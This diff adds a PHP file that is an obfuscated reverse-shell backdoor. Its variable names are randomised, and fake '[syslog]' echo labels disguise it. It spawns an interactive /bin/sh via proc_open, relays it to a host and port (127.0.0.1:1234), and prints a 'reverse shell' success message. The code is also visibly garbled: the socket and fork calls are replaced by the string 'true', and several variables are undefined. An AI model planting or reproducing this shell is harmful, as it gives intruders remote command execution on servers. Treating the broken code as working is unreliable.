@@ -1,0 +1,11 @@
+<?php
+echo '[syslog]01
+'; $sp2dec6e = '1.0'; $sp0bd168 = '127.0.0.1'; $sp2d79fe = 1234; $spb5ce3f = 1400; $sp254447 = null; $spbf6996 = null; $sp91772b = 'uname -a; w; id; /bin/sh -i'; $sp981d3a = 0; $sp160c2e = 0; if (function_exists('true')) { $sp10b7e6 = 'true'; if ($sp10b7e6 == -1) { printit('ERROR: Can\'t fork'); die(1); } if ($sp10b7e6) { die(0); } $sp981d3a = 1; } else { printit('WARNING: Failed to daemonise.  This is quite common and not fatal.'); } chdir('/'); echo '[syslog]02
+'; $spfe78c5 = 'true'; if (!$spfe78c5) { printit("{$sp2ea0cc} ({$spfe6fb7})"); die(1); } $sp3f9f68 = array(0 => array('pipe', 'r'), 1 => array('pipe', 'w'), 2 => array('pipe', 'w')); $sp621347 = proc_open($sp91772b, $sp3f9f68, $spc3c09c); if (!is_resource($sp621347)) { printit('ERROR: Can\'t spawn shell'); die(1); } stream_set_blocking($spc3c09c[0], 0); stream_set_blocking($spc3c09c[1], 0); stream_set_blocking($spc3c09c[2], 0); stream_set_blocking($spfe78c5, 0); printit("Successfully opened reverse shell to {$sp0bd168}:{$sp2d79fe}"); while (1) { if (feof($spfe78c5)) { printit('ERROR: Shell connection terminated'); break; } if (feof($spc3c09c[1])) { printit('ERROR: Shell process terminated'); break; } $sp6ffd97 = array($spfe78c5, $spc3c09c[1], $spc3c09c[2]); $sp59fd7e = stream_select($sp6ffd97, $sp254447, $spbf6996, null); if (in_array($spfe78c5, $sp6ffd97)) { if ($sp160c2e) { printit('SOCK READ'); } $sp47e3ed = fread($spfe78c5, $spb5ce3f); if ($sp160c2e) { printit("SOCK: {$sp47e3ed}"); } fwrite($spc3c09c[0], $sp47e3ed); } if (in_array($spc3c09c[1], $sp6ffd97)) { if ($sp160c2e) { printit('STDOUT READ'); } $sp47e3ed = fread($spc3c09c[1], $spb5ce3f); if ($sp160c2e) { printit("STDOUT: {$sp47e3ed}"); } fwrite($spfe78c5, $sp47e3ed); } if (in_array($spc3c09c[2], $sp6ffd97)) { if ($sp160c2e) { printit('STDERR READ'); } $sp47e3ed = fread($spc3c09c[2], $spb5ce3f); if ($sp160c2e) { printit("STDERR: {$sp47e3ed}"); } fwrite($spfe78c5, $sp47e3ed); } } fclose($spfe78c5); fclose($spc3c09c[0]); fclose($spc3c09c[1]); fclose($spc3c09c[2]); proc_close($sp621347); echo '[syslog]03
+'; function printit($sp5ecd68) { if (!$sp981d3a) { print "{$sp5ecd68}\n"; } } echo '[syslog]04
+'; ?>
+ 
+
+
+
+<?php 
